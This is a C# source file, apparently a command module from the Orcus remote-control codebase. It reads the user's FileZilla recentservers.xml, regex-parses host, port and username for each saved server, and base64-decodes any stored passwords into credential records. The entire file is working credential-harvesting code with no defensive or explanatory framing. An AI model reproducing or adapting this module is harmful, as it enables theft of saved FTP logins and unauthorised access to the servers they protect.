using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.FileZilla
{
    internal class FileZilla : IPasswordRecovery
    {
        private const string ApplicationName = "FileZilla";

        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            var file =
                new FileInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "FileZilla\\recentservers.xml"));
            if (file.Exists)
            {
                foreach (
                    var entry in
                        File.ReadAllText(file.FullName)
                            .Split(new[] {"<Server>"}, StringSplitOptions.RemoveEmptyEntries)
                            .Select(x => x.Replace("\n", null).Replace("\r", null))
                    )
                {
                    if (entry.Contains("<Pass encoding=\"base64\">"))
                    {
                        var match =
                            Regex.Match(entry,
                                @"<Host>(?<host>(.*?))</Host>\s*<Port>(?<port>([0-9]{1,4}?))</Port>.*?<User>(?<login>(.*?))</User>.*?<Pass encoding=""base64"">(?<password>(.*?))</Pass>");
                        if (match.Success)
                        {
                            yield return new RecoveredPassword
                            {
                                Field1 = match.Groups["host"].Value,
                                Password =
                                    Encoding.UTF8.GetString(Convert.FromBase64String(match.Groups["password"].Value)),
                                UserName = match.Groups["login"].Value,
                                Field2 = match.Groups["port"].Value,
                                Application = ApplicationName,
                                PasswordType = PasswordType.Adminsys
                            };
                        }
                    }
                    else
                    {
                        var match =
                            Regex.Match(entry,
                                @"<Host>(?<host>(.*?))</Host>\s*<Port>(?<port>([0-9]{1,4}?))</Port>.*?<User>(?<login>(.*?))</User>");
                        if (match.Success)
                        {
                            yield return new RecoveredPassword
                            {
                                Field1 = match.Groups["host"].Value,
                                UserName = match.Groups["login"].Value,
                                Field2 = match.Groups["port"].Value,
                                Application = ApplicationName,
                                PasswordType = PasswordType.Adminsys
                            };
                        }
                    }
                }
            }
        }
    }
}